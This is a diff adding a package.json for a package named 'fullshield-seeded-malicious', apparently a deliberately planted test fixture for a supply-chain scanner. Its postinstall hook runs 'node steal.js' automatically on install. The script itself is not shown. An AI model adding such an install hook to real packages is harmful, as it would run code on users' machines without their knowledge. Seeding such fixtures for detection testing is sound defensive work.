@@ -1,0 +1,7 @@
+{
+  "name": "fullshield-seeded-malicious",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node steal.js"
+  }
+}
